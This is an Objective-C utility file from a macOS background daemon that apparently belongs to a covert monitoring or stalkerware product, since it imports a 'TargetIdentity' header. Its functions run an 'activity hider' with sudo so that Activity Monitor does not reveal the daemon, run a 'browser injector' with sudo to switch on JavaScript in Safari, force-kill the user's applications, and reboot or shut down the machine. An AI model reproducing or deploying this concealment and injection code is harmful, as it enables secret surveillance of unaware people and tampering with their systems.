//
//  blbldUtils.m
//  blbld
//
//  Created by Makara Khloth on 2/18/15.
//
//

#import "blbldUtils.h"
#import "TargetIdentity.h"

#import <sys/utsname.h>
#import <mach/mach.h>
#include <sys/socket.h> // Per msqr
#include <sys/sysctl.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <CoreServices/CoreServices.h>
#include <Carbon/Carbon.h>
#include <SystemConfiguration/SystemConfiguration.h>
#import <AppKit/AppKit.h>
#include <errno.h>
#include <libproc.h>

@interface blbldUtils (private)
+ (void) killall;
+ (OSStatus) SendAppleEventToSystemProcess: (AEEventID) EventToSend;
@end

@implementation blbldUtils

+ (NSString *) userLogonName {
    uid_t uid = 0;
    gid_t gid = 0;
    NSString *username = (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    return ([username autorelease]);
}

+ (NSArray *) getRunnigProcesses {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t miblen = 4;
    size_t size;
    int st = sysctl(mib, miblen, NULL, &size, NULL, 0);
    struct kinfo_proc * process = NULL;
    struct kinfo_proc * newprocess = NULL;
    do {
        size += size / 10;
        newprocess = realloc(process, size);
        if (!newprocess){
            if (process){
                free(process);
            }
            return nil;
        }
        process = newprocess;
        st = sysctl(mib, miblen, process, &size, NULL, 0);
    } while (st == -1 && errno == ENOMEM);
    if (st == 0){
        if (size % sizeof(struct kinfo_proc) == 0){
            int nprocess = size / sizeof(struct kinfo_proc);
            if (nprocess){
                NSMutableArray * array = [[NSMutableArray alloc] init];
                for (int i = nprocess - 1; i >= 0; i--){
                    NSString * processID = [[NSString alloc] initWithFormat:@"%d", process[i].kp_proc.p_pid];
                    NSString * processName = [[NSString alloc] initWithFormat:@"%s", process[i].kp_proc.p_comm];
                    NSDictionary * dict = [[NSDictionary alloc] initWithObjects:[NSArray arrayWithObjects:processID, processName, nil]
                                                                        forKeys:[NSArray arrayWithObjects:kRunningProcessIDTag,kRunningProcessNameTag,nil]];
                    [processID release];
                    [processName release];
                    [array addObject:dict];
                    [dict release];
                }
                free(process);
                return [array autorelease];
            }
        }
    }
    return nil;
}


+ (NSString *) pathOfPID: (int) aPID {
    NSString *path = nil;
    pid_t pid = aPID;
    char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
    
    int ret = proc_pidpath (pid, pathbuf, sizeof(pathbuf));
    if ( ret <= 0 ) {
        fprintf(stderr, "PID %d: proc_pidpath ();\n", pid);
        fprintf(stderr, "    %s\n", strerror(errno));
    } else {
        printf("proc %d: %s\n", pid, pathbuf);
        path = [NSString stringWithUTF8String:pathbuf];
    }
    //DLog(@"path : %@", path);
    return path;
}

+ (BOOL) isActivityMonitorIsRunning {
   if ([[NSRunningApplication runningApplicationsWithBundleIdentifier:kActivityMonitor] count]>0) {
        DLog(@"isActivityMonitorIsRunning");
        return YES;
    }else{
        return NO;
    }
}

+ (void) hideActivityMonitor: (NSString *) aActivityHiderPath {
    DLog(@"hideActivityMonitor : %@", aActivityHiderPath);
    NSString * strCMD = [NSString stringWithFormat:@"sudo %@",aActivityHiderPath];
    system([strCMD cStringUsingEncoding:NSUTF8StringEncoding]);
}

+(BOOL) isSafariIsRunning {
    if ([[NSRunningApplication runningApplicationsWithBundleIdentifier:kSafari] count]>0) {
        DLog(@"SafariIsRunning");
        return YES;
    }else{
        return NO;
    }
}

+ (void) allowJavaScriptInSafari:  (NSString *) aBrowserInjectorPath {
    DLog(@"allowJavaScriptInSafari");
    NSString * strCMD = [NSString stringWithFormat:@"sudo %@", aBrowserInjectorPath];
    system([strCMD cStringUsingEncoding:NSUTF8StringEncoding]);
}

+ (void) reboot {
    DLog(@"System is being reboot");
    
    [NSThread sleepForTimeInterval:15];
    [self killallV2];
    
    if ([self SendAppleEventToSystemProcess:kAERestart] != noErr) {
        DLog(@"Reboot using command line");
        system("shutdown -r now");
    }
}

+ (void) shutdown {
    DLog(@"System is being shutdown");
    
    [NSThread sleepForTimeInterval:15];
    [self killallV2];
    
    if ([self SendAppleEventToSystemProcess:kAEShutDown] != noErr) {
        DLog(@"Shutdown using command line");
        system("shutdown now");
    }
}

+ (void) killall {
    uid_t uid				= 0;
    gid_t gid				= 0;
    NSString *username =  (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    DLog(@"Kill all processes belong to username = %@", username);
    
    NSString *myCmd = [NSString stringWithFormat:@"killall -u %@", username];
    system([myCmd UTF8String]);
}

+ (void) killallV2 {
    NSMutableArray *pidsToKill = [NSMutableArray array];
    NSArray *processes = [self getRunnigProcesses];
    for (NSDictionary *process in processes) {
        NSString *pid = [process objectForKey:kRunningProcessIDTag];
        //DLog(@"pid : %@, pname : %@", [process objectForKey:kRunningProcessIDTag], [process objectForKey:kRunningProcessNameTag]);
        NSString *pathOfPID = [self pathOfPID:pid.intValue];
        if (pathOfPID && [pathOfPID rangeOfString:@"/Applications/"].location == 0) {
            [pidsToKill addObject:pid];
        }
    }
    //DLog(@"pidsToKill : %@", pidsToKill);
    
    NSString *strCmd = @"kill -9 ";
    for (NSString *pid in pidsToKill) {
        system([[strCmd stringByAppendingString:pid] UTF8String]);
    }
}

// https://developer.apple.com/library/mac/qa/qa1134/_index.html
+ (OSStatus) SendAppleEventToSystemProcess: (AEEventID) EventToSend
{
    AEAddressDesc targetDesc;
    static const ProcessSerialNumber kPSNOfSystemProcess = { 0, kSystemProcess };
    AppleEvent eventReply = {typeNull, NULL};
    AppleEvent appleEventToSend = {typeNull, NULL};
    
    OSStatus error = noErr;
    
    error = AECreateDesc(typeProcessSerialNumber, &kPSNOfSystemProcess,
                         sizeof(kPSNOfSystemProcess), &targetDesc);
    
    if (error != noErr)
    {
        return(error);
    }
    
    error = AECreateAppleEvent(kCoreEventClass, EventToSend, &targetDesc,
                               kAutoGenerateReturnID, kAnyTransactionID, &appleEventToSend);
    
    AEDisposeDesc(&targetDesc);
    if (error != noErr)
    {
        return(error);
    }
    
    error = AESend(&appleEventToSend, &eventReply, kAENoReply,
                   kAENormalPriority, kAEDefaultTimeout, NULL, NULL);
    
    AEDisposeDesc(&appleEventToSend);
    if (error != noErr)
    {
        return(error);
    }
    
    AEDisposeDesc(&eventReply);
    
    return(error); 
}

@end
